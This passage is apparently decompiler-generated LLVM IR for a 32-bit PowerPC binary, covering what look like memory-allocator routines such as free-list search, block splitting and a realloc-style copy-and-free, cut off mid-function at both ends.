  %v3_100080fc = icmp eq i32 %v3_100080ec, 0
  br i1 %v3_100080fc, label %dec_label_pc_10008104, label %dec_label_pc_100081b4.thread

dec_label_pc_100081b4.thread:                     ; preds = %dec_label_pc_100080c8
  br label %dec_label_pc_100081c8

dec_label_pc_10008104:                            ; preds = %dec_label_pc_100080c8
  %v3_10008108 = load i32, i32* @global_var_100104ac.199, align 4
  store i32 %v3_10008108, i32* %r31.global-to-local, align 4
  %v3_1000810c = load i32, i32* %stack_var_-40, align 4
  %v2_10008110 = icmp ult i32 %v3_1000810c, %v3_10008108
  br i1 %v2_10008110, label %dec_label_pc_10008128, label %dec_label_pc_10008118

dec_label_pc_10008118:                            ; preds = %dec_label_pc_10008104
  %v1_1000811c = sub i32 0, %v3_10008108
  %v2_10008118 = add i32 %v3_10008108, -1
  %v1_10008120 = add i32 %v2_10008118, %v3_1000810c
  %v2_10008124 = and i32 %v1_10008120, %v1_1000811c
  store i32 %v2_10008124, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008128

dec_label_pc_10008128:                            ; preds = %dec_label_pc_10008104, %dec_label_pc_10008118
  %v0_10008134 = call i32 @function_100091f8()
  %v0_10008138 = load i32, i32* %r31.global-to-local, align 4
  store i32 268468544, i32* @lr, align 4
  %v1_1000813c = call i32 @function_10009994(i32 %v0_10008138)
  %v3_10008140 = icmp eq i32 %v1_1000813c, -1
  br i1 %v3_10008140, label %dec_label_pc_10008160, label %dec_label_pc_10008148

dec_label_pc_10008148:                            ; preds = %dec_label_pc_10008128
  %v1_10008148 = add i32 %v1_1000813c, 3
  %v1_1000814c = call i32 @__asm_rlwinm(i32 %v1_10008148, i32 0, i32 0, i32 29)
  store i32 %v1_1000814c, i32* @r30, align 4
  %v4_10008150 = icmp eq i32 %v1_1000814c, %v1_1000813c
  br i1 %v4_10008150, label %dec_label_pc_10008160, label %dec_label_pc_10008158

dec_label_pc_10008158:                            ; preds = %dec_label_pc_10008148
  %v2_10008158 = sub i32 %v1_1000814c, %v1_1000813c
  store i32 268468576, i32* @lr, align 4
  %v1_1000815c = call i32 @function_10009994(i32 %v2_10008158)
  br label %dec_label_pc_10008160

dec_label_pc_10008160:                            ; preds = %dec_label_pc_10008148, %dec_label_pc_10008128, %dec_label_pc_10008158
  %v0_10008168 = call i32 @function_100091f8()
  %v0_1000816c = load i32, i32* @r30, align 4
  %v3_1000816c = icmp eq i32 %v0_1000816c, -1
  br i1 %v3_1000816c, label %dec_label_pc_100081d0, label %dec_label_pc_100081b4

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_10008160
  store i32 ptrtoint (i32* @global_var_10012af4.267 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010440 to i32), i32* @r29, align 4
  %v0_10008188 = call i32 @function_100091f8()
  %v0_1000818c = load i32, i32* @r31, align 4
  %v0_10008190 = load i32, i32* @r30, align 4
  %v0_10008194 = load i32, i32* @r29, align 4
  store i32 268468636, i32* @lr, align 4
  %v3_10008198 = inttoptr i32 %v0_10008194 to i32*
  %v4_10008198 = call i32 @function_100085ac(i32* %v3_10008198, i32 %v0_10008190, i32 %v0_1000818c)
  %v0_1000819c = load i32, i32* @r29, align 4
  %v2_100081a4 = inttoptr i32 %v0_1000819c to i32*
  %v3_100081a4 = call i32 @function_10008428(i32* %v2_100081a4, i32 %v2_100080e4)
  store i32 %v3_100081a4, i32* %r31.global-to-local, align 4
  %v0_100081b0 = call i32 @function_100091f8()
  %v3_100081b4 = icmp eq i32 %v3_100081a4, 0
  br i1 %v3_100081b4, label %dec_label_pc_100081c8.thread, label %dec_label_pc_100081c8

dec_label_pc_100081c8.thread:                     ; preds = %dec_label_pc_100081b4
  br label %dec_label_pc_100081d0

dec_label_pc_100081c8:                            ; preds = %dec_label_pc_100081b4, %dec_label_pc_100081b4.thread
  %v0_100081c8.pr6 = phi i32 [ %v3_100080ec, %dec_label_pc_100081b4.thread ], [ %v3_100081a4, %dec_label_pc_100081b4 ]
  %v3_100081bc = load i32, i32* %stack_var_-40, align 4
  %v2_100081c0 = inttoptr i32 %v0_100081c8.pr6 to i32*
  store i32 %v3_100081bc, i32* %v2_100081c0, align 4
  %v0_100081c4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100081c4 = add i32 %v0_100081c4, 4
  store i32 %v1_100081c4, i32* @r31, align 4
  %v3_100081c8 = icmp eq i32 %v1_100081c4, 0
  br i1 %v3_100081c8, label %dec_label_pc_100081d0, label %dec_label_pc_100081e0

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_100081c8.thread, %dec_label_pc_100081c8, %dec_label_pc_10008160, %dec_label_pc_100080bc
  %v0_100081d0 = call i32 @function_10004e38()
  %v2_100081d8 = inttoptr i32 %v0_100081d0 to i32*
  store i32 12, i32* %v2_100081d8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100081e0

dec_label_pc_100081e0:                            ; preds = %dec_label_pc_100081c8, %dec_label_pc_100081d0
  %v0_100081e4 = phi i32 [ %v1_100081c4, %dec_label_pc_100081c8 ], [ 0, %dec_label_pc_100081d0 ]
  ret i32 %v0_100081e4

; uselistorder directives
  uselistorder i32 %v1_100081c4, { 1, 0, 2 }
  uselistorder i32 %v1_1000814c, { 1, 0, 2 }
  uselistorder i32 %v1_1000813c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10008108, { 1, 0, 2, 3 }
  uselistorder i32 %v3_100080ec, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_100081e0, { 1, 0 }
  uselistorder label %dec_label_pc_100081d0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10008160, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008128, { 1, 0 }
  uselistorder label %dec_label_pc_100080bc, { 1, 0 }
}

define i32 @function_100081f8() local_unnamed_addr {
dec_label_pc_100081f8:
  %v0_100081f8 = load i32, i32* @r3, align 4
  %v3_100081f8 = icmp eq i32 %v0_100081f8, 0
  br i1 %v3_100081f8, label %dec_label_pc_100082e4, label %dec_label_pc_10008210

dec_label_pc_10008210:                            ; preds = %dec_label_pc_100081f8
  %v1_10008214 = add i32 %v0_100081f8, -4
  %v2_10008214 = inttoptr i32 %v1_10008214 to i32*
  %v3_10008214 = load i32, i32* %v2_10008214, align 4
  store i32 %v3_10008214, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r26, align 4
  %v0_10008228 = call i32 @function_100091f8()
  %v0_10008230 = load i32, i32* @r28, align 4
  store i32 268468796, i32* @lr, align 4
  %v4_10008238 = call i32 @function_100085ac(i32* nonnull @global_var_10010440, i32 %v1_10008214, i32 %v0_10008230)
  %v3_10008240 = load i32, i32* @global_var_100104ac.199, align 4
  store i32 %v4_10008238, i32* @r29, align 4
  %v1_10008248 = inttoptr i32 %v4_10008238 to i32*
  %v2_10008248 = load i32, i32* %v1_10008248, align 4
  store i32 %v2_10008248, i32* @r27, align 4
  %v1_1000824c = mul i32 %v3_10008240, 8
  %v2_10008250 = icmp ult i32 %v2_10008248, %v1_1000824c
  br i1 %v2_10008250, label %dec_label_pc_10008284, label %dec_label_pc_10008258

dec_label_pc_10008258:                            ; preds = %dec_label_pc_10008210
  store i32 ptrtoint (i32* @global_var_10012d24.270 to i32), i32* @r28, align 4
  %v0_10008268 = call i32 @function_100091f8()
  store i32 268468852, i32* @lr, align 4
  %v1_10008270 = call i32 @function_10009994(i32 0)
  %v0_10008274 = load i32, i32* @r31, align 4
  %v4_10008274 = icmp eq i32 %v0_10008274, %v1_10008270
  br i1 %v4_10008274, label %dec_label_pc_1000828c, label %dec_label_pc_1000827c

dec_label_pc_1000827c:                            ; preds = %dec_label_pc_10008258
  %v0_10008280 = call i32 @function_100091f8()
  br label %dec_label_pc_10008284

dec_label_pc_10008284:                            ; preds = %dec_label_pc_10008210, %dec_label_pc_1000827c
  br label %dec_label_pc_100082e0

dec_label_pc_1000828c:                            ; preds = %dec_label_pc_10008258
  %v0_1000828c = load i32, i32* @r29, align 4
  %v1_1000828c = add i32 %v0_1000828c, 4
  %v2_1000828c = inttoptr i32 %v1_1000828c to i32*
  %v3_1000828c = load i32, i32* %v2_1000828c, align 4
  %v3_10008290 = icmp eq i32 %v3_1000828c, 0
  br i1 %v3_10008290, label %dec_label_pc_100082a0, label %dec_label_pc_10008298

dec_label_pc_10008298:                            ; preds = %dec_label_pc_1000828c
  %v1_10008298 = add i32 %v0_1000828c, 8
  %v2_10008298 = inttoptr i32 %v1_10008298 to i32*
  %v3_10008298 = load i32, i32* %v2_10008298, align 4
  %v2_1000829c = add i32 %v3_1000828c, 8
  %v3_1000829c = inttoptr i32 %v2_1000829c to i32*
  store i32 %v3_10008298, i32* %v3_1000829c, align 4
  %v0_100082a0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100082a0

dec_label_pc_100082a0:                            ; preds = %dec_label_pc_1000828c, %dec_label_pc_10008298
  %v0_100082a0 = phi i32 [ %v0_1000828c, %dec_label_pc_1000828c ], [ %v0_100082a0.pre, %dec_label_pc_10008298 ]
  %v1_100082a0 = add i32 %v0_100082a0, 8
  %v2_100082a0 = inttoptr i32 %v1_100082a0 to i32*
  %v3_100082a0 = load i32, i32* %v2_100082a0, align 4
  %v1_100082a4 = add i32 %v0_100082a0, 4
  %v2_100082a4 = inttoptr i32 %v1_100082a4 to i32*
  %v3_100082a4 = load i32, i32* %v2_100082a4, align 4
  %v3_100082a8 = icmp eq i32 %v3_100082a0, 0
  br i1 %v3_100082a8, label %dec_label_pc_100082b8, label %dec_label_pc_100082b0

dec_label_pc_100082b0:                            ; preds = %dec_label_pc_100082a0
  %v2_100082b0 = add i32 %v3_100082a0, 4
  %v3_100082b0 = inttoptr i32 %v2_100082b0 to i32*
  store i32 %v3_100082a4, i32* %v3_100082b0, align 4
  br label %dec_label_pc_100082bc

dec_label_pc_100082b8:                            ; preds = %dec_label_pc_100082a0
  store i32 %v3_100082a4, i32* @global_var_10010440, align 4
  br label %dec_label_pc_100082bc

dec_label_pc_100082bc:                            ; preds = %dec_label_pc_100082b0, %dec_label_pc_100082b8
  %v0_100082c4 = call i32 @function_100091f8()
  %v0_100082c8 = load i32, i32* @r27, align 4
  %v1_100082c8 = load i32, i32* @r29, align 4
  %v0_100082d0 = load i32, i32* @r31, align 4
  %v2_100082c8 = sub i32 12, %v0_100082c8
  %v1_100082cc = add i32 %v2_100082c8, %v1_100082c8
  %v2_100082d0 = sub i32 %v1_100082cc, %v0_100082d0
  store i32 268468952, i32* @lr, align 4
  %v1_100082d4 = call i32 @function_10009994(i32 %v2_100082d0)
  br label %dec_label_pc_100082e0

dec_label_pc_100082e0:                            ; preds = %dec_label_pc_10008284, %dec_label_pc_100082bc
  %v0_100082e0 = call i32 @function_100091f8()
  br label %dec_label_pc_100082e4

dec_label_pc_100082e4:                            ; preds = %dec_label_pc_100081f8, %dec_label_pc_100082e0
  %.0 = phi i32 [ undef, %dec_label_pc_100081f8 ], [ %v0_100082e0, %dec_label_pc_100082e0 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_100082a0, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_10009994, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100082e4, { 1, 0 }
  uselistorder label %dec_label_pc_100082e0, { 1, 0 }
  uselistorder label %dec_label_pc_100082bc, { 1, 0 }
  uselistorder label %dec_label_pc_100082a0, { 1, 0 }
  uselistorder label %dec_label_pc_10008284, { 1, 0 }
}

define i32 @function_100082f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100082f8:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100082f8 = load i32, i32* @r4, align 4
  %v3_100082f8 = icmp eq i32 %v0_100082f8, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_100082f8, label %dec_label_pc_10008314, label %dec_label_pc_10008320

dec_label_pc_10008314:                            ; preds = %dec_label_pc_100082f8
  store i32 ptrtoint ([3 x i8]* @global_var_10008318.273 to i32), i32* @lr, align 4
  %v0_10008314 = call i32 @function_100081f8()
  br label %dec_label_pc_1000832c

dec_label_pc_10008320:                            ; preds = %dec_label_pc_100082f8
  %v3_10008320 = icmp eq i32 %arg1, 0
  br i1 %v3_10008320, label %dec_label_pc_1000832c, label %dec_label_pc_10008338

dec_label_pc_1000832c:                            ; preds = %dec_label_pc_10008320, %dec_label_pc_10008314
  %storemerge = phi i32 [ 0, %dec_label_pc_10008314 ], [ %v0_100082f8, %dec_label_pc_10008320 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268469040, i32* @lr, align 4
  %v0_1000832c = call i32 @function_100080a0()
  store i32 %v0_1000832c, i32* @r28, align 4
  br label %dec_label_pc_10008410

dec_label_pc_10008338:                            ; preds = %dec_label_pc_10008320
  %v1_10008338 = add i32 %v0_100082f8, 7
  %v1_1000833c = add i32 %arg1, -4
  store i32 %v1_1000833c, i32* %r27.global-to-local, align 4
  %v1_10008340 = call i32 @__asm_rlwinm(i32 %v1_10008338, i32 0, i32 0, i32 29)
  store i32 %v1_10008340, i32* %r31.global-to-local, align 4
  %v2_10008344 = inttoptr i32 %v1_1000833c to i32*
  %v3_10008344 = load i32, i32* %v2_10008344, align 4
  store i32 %v3_10008344, i32* @r30, align 4
  %v2_10008348 = icmp ugt i32 %v1_10008340, 11
  br i1 %v2_10008348, label %dec_label_pc_10008354, label %dec_label_pc_10008350

dec_label_pc_10008350:                            ; preds = %dec_label_pc_10008338
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008354

dec_label_pc_10008354:                            ; preds = %dec_label_pc_10008338, %dec_label_pc_10008350
  %v0_100083d4 = phi i32 [ %v1_10008340, %dec_label_pc_10008338 ], [ 12, %dec_label_pc_10008350 ]
  %v3_10008354 = icmp ugt i32 %v0_100083d4, %v3_10008344
  br i1 %v3_10008354, label %dec_label_pc_1000835c, label %dec_label_pc_100083d4

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_10008354
  store i32 ptrtoint (i32* @global_var_10012af4.267 to i32), i32* @r29, align 4
  %v0_10008368 = call i32 @function_100091f8()
  %v0_10008370 = load i32, i32* %r27.global-to-local, align 4
  %v1_10008370 = load i32, i32* @r30, align 4
  %v2_10008370 = add i32 %v1_10008370, %v0_10008370
  %v1_10008374 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008374 = sub i32 %v1_10008374, %v1_10008370
  %v4_1000837c = call i32 @function_100084c8(i32* nonnull @global_var_10010440, i32 %v2_10008370, i32 %v2_10008374)
  store i32 %v4_1000837c, i32* %r27.global-to-local, align 4
  %v0_10008388 = call i32 @function_100091f8()
  %v3_1000838c = icmp eq i32 %v4_1000837c, 0
  br i1 %v3_1000838c, label %dec_label_pc_100083a0, label %dec_label_pc_10008394

dec_label_pc_10008394:                            ; preds = %dec_label_pc_1000835c
  %v0_10008394 = load i32, i32* @r30, align 4
  %v2_10008394 = add i32 %v0_10008394, %v4_1000837c
  %v1_10008398 = load i32, i32* @r28, align 4
  %v2_10008398 = add i32 %v1_10008398, -4
  %v3_10008398 = inttoptr i32 %v2_10008398 to i32*
  store i32 %v2_10008394, i32* %v3_10008398, align 4
  br label %dec_label_pc_10008410

dec_label_pc_100083a0:                            ; preds = %dec_label_pc_1000835c
  %v0_100083a0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100083a0 = add i32 %v0_100083a0, -4
  store i32 %v1_100083a0, i32* @r3, align 4
  store i32 268469160, i32* @lr, align 4
  %v0_100083a4 = call i32 @function_100080a0()
  store i32 %v0_100083a4, i32* @r3, align 4
  store i32 %v0_100083a4, i32* @r31, align 4
  %v3_100083a8 = icmp eq i32 %v0_100083a4, 0
  br i1 %v3_100083a8, label %dec_label_pc_100083b0, label %dec_label_pc_100083b8

dec_label_pc_100083b0:                            ; preds = %dec_label_pc_100083a0
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008410

dec_label_pc_100083b8:                            ; preds = %dec_label_pc_100083a0
  %v0_100083b8 = load i32, i32* @r28, align 4
  store i32 %v0_100083b8, i32* @r4, align 4
  %v0_100083bc = load i32, i32* @r30, align 4
  %v1_100083bc = add i32 %v0_100083bc, -4
  store i32 %v1_100083bc, i32* @r5, align 4
  store i32 268469188, i32* @lr, align 4
  %v0_100083c0 = call i32 @function_10007108()
  %v0_100083c4 = load i32, i32* @r28, align 4
  store i32 %v0_100083c4, i32* @r3, align 4
  store i32 268469196, i32* @lr, align 4
  %v0_100083c8 = call i32 @function_100081f8()
  %v0_100083cc = load i32, i32* @r31, align 4
  store i32 %v0_100083cc, i32* @r28, align 4
  br label %dec_label_pc_10008410

dec_label_pc_100083d4:                            ; preds = %dec_label_pc_10008354
  %v1_100083d4 = add i32 %v0_100083d4, 28
  %v3_100083d8 = icmp ugt i32 %v1_100083d4, %v3_10008344
  br i1 %v3_100083d8, label %dec_label_pc_10008410, label %dec_label_pc_100083e0

dec_label_pc_100083e0:                            ; preds = %dec_label_pc_100083d4
  store i32 ptrtoint (i32* @global_var_10012af4.267 to i32), i32* @r29, align 4
  %v0_100083ec = call i32 @function_100091f8()
  %v0_100083f4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100083f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100083f4 = add i32 %v1_100083f4, %v0_100083f4
  %v1_100083f8 = load i32, i32* @r30, align 4
  %v2_100083f8 = sub i32 %v1_100083f8, %v1_100083f4
  store i32 268469252, i32* @lr, align 4
  %v4_10008400 = call i32 @function_100085ac(i32* nonnull @global_var_10010440, i32 %v2_100083f4, i32 %v2_100083f8)
  %v0_10008408 = call i32 @function_100091f8()
  %v0_1000840c = load i32, i32* @r31, align 4
  %v1_1000840c = load i32, i32* @r28, align 4
  %v2_1000840c = add i32 %v1_1000840c, -4
  %v3_1000840c = inttoptr i32 %v2_1000840c to i32*
  store i32 %v0_1000840c, i32* %v3_1000840c, align 4
  br label %dec_label_pc_10008410

dec_label_pc_10008410:                            ; preds = %dec_label_pc_100083d4, %dec_label_pc_100083b8, %dec_label_pc_100083b0, %dec_label_pc_10008394, %dec_label_pc_1000832c, %dec_label_pc_100083e0
  %v0_10008414 = load i32, i32* @r28, align 4
  ret i32 %v0_10008414

; uselistorder directives
  uselistorder i32 %v1_100083f4, { 1, 0 }
  uselistorder i32 %v4_1000837c, { 1, 0, 2 }
  uselistorder i32 %v1_10008370, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_10010440, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10008410, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10008354, { 1, 0 }
}

define i32 @function_10008428(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008428:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10008428 = inttoptr i32 %arg2 to i32*
  %v2_10008428 = load i32, i32* %v1_10008428, align 4
  %v1_1000842c = add i32 %v2_10008428, 3
  store i32 %v1_1000842c, i32* %r9.global-to-local, align 4
  %v1_10008430 = call i32 @__asm_rlwinm(i32 %v1_1000842c, i32 0, i32 0, i32 29)
  %v2_10008434 = icmp ugt i32 %v1_10008430, 11
  br i1 %v2_10008434, label %dec_label_pc_100084b8.preheader, label %dec_label_pc_1000843c

dec_label_pc_1000843c:                            ; preds = %dec_label_pc_10008428
  br label %dec_label_pc_100084b8.preheader

dec_label_pc_100084b8.preheader:                  ; preds = %dec_label_pc_10008428, %dec_label_pc_1000843c
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1000843c ], [ %v1_10008430, %dec_label_pc_10008428 ]
  %v0_1000849c = phi i32 [ 12, %dec_label_pc_1000843c ], [ %v1_10008430, %dec_label_pc_10008428 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_100084b85 = icmp eq i32 %storemerge2, 0
  br i1 %v3_100084b85, label %dec_label_pc_100084c0, label %dec_label_pc_10008448

dec_label_pc_10008448:                            ; preds = %dec_label_pc_100084b8.preheader, %dec_label_pc_100084b4
  %v0_100084b4 = phi i32 [ %storemerge, %dec_label_pc_100084b4 ], [ %storemerge2, %dec_label_pc_100084b8.preheader ]
  %v1_10008448 = inttoptr i32 %v0_100084b4 to i32*
  %v2_10008448 = load i32, i32* %v1_10008448, align 4
  store i32 %v2_10008448, i32* %r10.global-to-local, align 4
  %v2_1000844c = icmp ult i32 %v2_10008448, %v0_1000849c
  br i1 %v2_1000844c, label %dec_label_pc_100084b4, label %dec_label_pc_10008454

dec_label_pc_10008454:                            ; preds = %dec_label_pc_10008448
  %v1_10008454 = add i32 %v0_1000849c, 44
  %v2_10008458 = icmp ult i32 %v2_10008448, %v1_10008454
  br i1 %v2_10008458, label %dec_label_pc_10008460, label %dec_label_pc_1000849c

dec_label_pc_10008460:                            ; preds = %dec_label_pc_10008454
  %v1_10008460 = add i32 %v0_100084b4, 4
  %v2_10008460 = inttoptr i32 %v1_10008460 to i32*
  %v3_10008460 = load i32, i32* %v2_10008460, align 4
  store i32 %v3_10008460, i32* %r11.global-to-local, align 4
  %v3_10008464 = icmp eq i32 %v3_10008460, 0
  br i1 %v3_10008464, label %dec_label_pc_10008474, label %dec_label_pc_1000846c

dec_label_pc_1000846c:                            ; preds = %dec_label_pc_10008460
  %v1_1000846c = add i32 %v0_100084b4, 8
  %v2_1000846c = inttoptr i32 %v1_1000846c to i32*
  %v3_1000846c = load i32, i32* %v2_1000846c, align 4
  %v2_10008470 = add i32 %v3_10008460, 8
  %v3_10008470 = inttoptr i32 %v2_10008470 to i32*
  store i32 %v3_1000846c, i32* %v3_10008470, align 4
  %v0_10008474.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10008490.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008474

dec_label_pc_10008474:                            ; preds = %dec_label_pc_10008460, %dec_label_pc_1000846c
  %v0_10008490 = phi i32 [ %v2_10008448, %dec_label_pc_10008460 ], [ %v0_10008490.pre, %dec_label_pc_1000846c ]
  %v0_10008474 = phi i32 [ %v0_100084b4, %dec_label_pc_10008460 ], [ %v0_10008474.pre, %dec_label_pc_1000846c ]
  %v1_10008474 = add i32 %v0_10008474, 8
  %v2_10008474 = inttoptr i32 %v1_10008474 to i32*
  %v3_10008474 = load i32, i32* %v2_10008474, align 4
  %v1_10008478 = add i32 %v0_10008474, 4
  %v2_10008478 = inttoptr i32 %v1_10008478 to i32*
  %v3_10008478 = load i32, i32* %v2_10008478, align 4
  %v3_1000847c = icmp eq i32 %v3_10008474, 0
  store i32 %v0_10008490, i32* %r11.global-to-local, align 4
  br i1 %v3_1000847c, label %dec_label_pc_10008490, label %dec_label_pc_10008484

dec_label_pc_10008484:                            ; preds = %dec_label_pc_10008474
  %v2_10008488 = add i32 %v3_10008474, 4
  %v3_10008488 = inttoptr i32 %v2_10008488 to i32*
  store i32 %v3_10008478, i32* %v3_10008488, align 4
  br label %dec_label_pc_100084a4

dec_label_pc_10008490:                            ; preds = %dec_label_pc_10008474
  store i32 %v3_10008478, i32* %arg1, align 4
  br label %dec_label_pc_100084a4

dec_label_pc_1000849c:                            ; preds = %dec_label_pc_10008454
  %v2_1000849c = sub i32 %v2_10008448, %v0_1000849c
  store i32 %v2_1000849c, i32* %v1_10008448, align 4
  br label %dec_label_pc_100084a4

dec_label_pc_100084a4:                            ; preds = %dec_label_pc_10008490, %dec_label_pc_10008484, %dec_label_pc_1000849c
  %v0_100084a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100084a4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100084a4 = sub i32 %v1_100084a4, %v0_100084a4
  store i32 %v2_100084a4, i32* %r9.global-to-local, align 4
  %v0_100084a8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100084a8, i32* %v1_10008428, align 4
  %v0_100084ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100084ac = add i32 %v0_100084ac, 12
  ret i32 %v1_100084ac

dec_label_pc_100084b4:                            ; preds = %dec_label_pc_10008448
  %v1_100084b4 = add i32 %v0_100084b4, 4
  %storemerge.in = inttoptr i32 %v1_100084b4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_100084b8 = icmp eq i32 %storemerge, 0
  br i1 %v3_100084b8, label %dec_label_pc_100084b8.dec_label_pc_100084c0_crit_edge, label %dec_label_pc_10008448

dec_label_pc_100084b8.dec_label_pc_100084c0_crit_edge: ; preds = %dec_label_pc_100084b4
  br label %dec_label_pc_100084c0

dec_label_pc_100084c0:                            ; preds = %dec_label_pc_100084b8.dec_label_pc_100084c0_crit_edge, %dec_label_pc_100084b8.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10008474, { 1, 0 }
  uselistorder i32 %v2_10008448, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_100084b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1000849c, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100084a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008474, { 1, 0 }
  uselistorder label %dec_label_pc_10008448, { 1, 0 }
  uselistorder label %dec_label_pc_100084b8.preheader, { 1, 0 }
}

define i32 @function_100084c8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100084c8:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100084c8 = load i32, i32* %arg1, align 4
  store i32 %v2_100084c8, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_100084d0 = add i32 %arg3, 3
  %v3_100085543 = icmp eq i32 %v2_100084c8, 0
  br i1 %v3_100085543, label %dec_label_pc_1000855c, label %dec_label_pc_100084d8

dec_label_pc_100084d8:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_10008550
  %v0_10008550 = phi i32 [ %v3_10008550, %dec_label_pc_10008550 ], [ %v2_100084c8, %dec_label_pc_100084c8 ]
  %v1_100084d8 = inttoptr i32 %v0_10008550 to i32*
  %v2_100084d8 = load i32, i32* %v1_100084d8, align 4
  %v2_100084dc = sub i32 %v0_10008550, %v2_100084d8
  %v1_100084e0 = add i32 %v2_100084dc, 12
  %v3_100084e4 = icmp ugt i32 %v1_100084e0, %arg2
  br i1 %v3_100084e4, label %dec_label_pc_10008550, label %dec_label_pc_100084ec

dec_label_pc_100084ec:                            ; preds = %dec_label_pc_100084d8
  %v4_100084e4 = icmp eq i32 %v1_100084e0, %arg2
  br i1 %v4_100084e4, label %dec_label_pc_100084f4, label %dec_label_pc_1000855c

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084ec
  %v1_100084f4 = call i32 @__asm_rlwinm(i32 %v1_100084d0, i32 0, i32 0, i32 29)
  %v2_100084f8 = icmp ult i32 %v2_100084d8, %v1_100084f4
  br i1 %v2_100084f8, label %dec_label_pc_1000855c, label %dec_label_pc_10008500

dec_label_pc_10008500:                            ; preds = %dec_label_pc_100084f4
  %v1_10008500 = add i32 %v1_100084f4, 44
  %v2_10008504 = icmp ult i32 %v2_100084d8, %v1_10008500
  br i1 %v2_10008504, label %dec_label_pc_1000850c, label %dec_label_pc_10008540

dec_label_pc_1000850c:                            ; preds = %dec_label_pc_10008500
  %v0_1000850c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000850c = add i32 %v0_1000850c, 4
  %v2_1000850c = inttoptr i32 %v1_1000850c to i32*
  %v3_1000850c = load i32, i32* %v2_1000850c, align 4
  %v3_10008510 = icmp eq i32 %v3_1000850c, 0
  br i1 %v3_10008510, label %dec_label_pc_10008520, label %dec_label_pc_10008518

dec_label_pc_10008518:                            ; preds = %dec_label_pc_1000850c
  %v1_10008518 = add i32 %v0_1000850c, 8
  %v2_10008518 = inttoptr i32 %v1_10008518 to i32*
  %v3_10008518 = load i32, i32* %v2_10008518, align 4
  %v2_1000851c = add i32 %v3_1000850c, 8
  %v3_1000851c = inttoptr i32 %v2_1000851c to i32*
  store i32 %v3_10008518, i32* %v3_1000851c, align 4
  %v0_10008520.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008520

dec_label_pc_10008520:                            ; preds = %dec_label_pc_1000850c, %dec_label_pc_10008518
  %v0_10008520 = phi i32 [ %v0_1000850c, %dec_label_pc_1000850c ], [ %v0_10008520.pre, %dec_label_pc_10008518 ]
  %v1_10008520 = add i32 %v0_10008520, 8
  %v2_10008520 = inttoptr i32 %v1_10008520 to i32*
  %v3_10008520 = load i32, i32* %v2_10008520, align 4
  %v1_10008524 = add i32 %v0_10008520, 4
  %v2_10008524 = inttoptr i32 %v1_10008524 to i32*
  %v3_10008524 = load i32, i32* %v2_10008524, align 4
  %v3_10008528 = icmp eq i32 %v3_10008520, 0
